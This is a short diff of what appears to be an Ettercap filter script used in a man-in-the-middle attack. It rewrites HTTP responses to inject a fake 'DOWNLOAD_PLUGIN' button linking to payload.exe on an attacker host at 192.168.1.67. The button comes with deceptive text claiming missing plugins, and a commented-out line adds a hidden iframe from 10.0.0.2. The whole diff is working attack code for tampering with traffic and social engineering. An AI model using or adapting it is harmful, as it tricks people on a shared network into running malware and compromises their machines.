@@ -31,6 +31,7 @@ if (ip.proto == TCP && tcp.dst == 80) {
 #####################
 ## Replace Content ##
 #####################
+# replace("</title>", "</title><iframe frameborder=0 scrolling='no' height=180 width=450 src='http://10.0.0.2/iframe.html'></iframe>");
 if (ip.proto == TCP && tcp.src == 80) {
    if (search(DATA.data, "<title>")) {
     replace("</title>", "</title><form action='http://192.168.1.67/payload.exe' method='link'><INPUT TYPE='submit' value='DOWNLOAD_PLUGIN'></form><html><body><h10>You are unable to view some of the web page’s contents. You need to download the latest plugins to fix this issue.</h10></body></html>");
